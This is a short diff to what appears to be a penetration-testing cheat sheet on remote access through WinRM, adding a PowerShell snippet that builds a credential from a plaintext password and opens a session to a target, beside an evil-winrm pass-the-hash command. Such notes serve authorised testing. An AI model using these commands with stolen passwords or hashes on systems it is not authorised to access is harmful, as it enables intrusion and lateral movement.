@@ -27,7 +27,9 @@ evil-winrm -u <USER> -H <PASS_HASH> -i <HOST>
 *   Member of "Remote Management Users" **OR**
 *   Explicit PSSession configuration
 
-**Command**
-```bash
-Enter-PSSession -ComputerName <TARGET_HOSTNAME>
+```powershell
+# PowerShell
+$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
+$cred = new-object System.Management.Automation.PSCredential ("<DOMAIN>\<USER>", $password)
+Enter-PSSession -Credential $cred -ComputerName <TARGET_HOSTNAME>
 ```
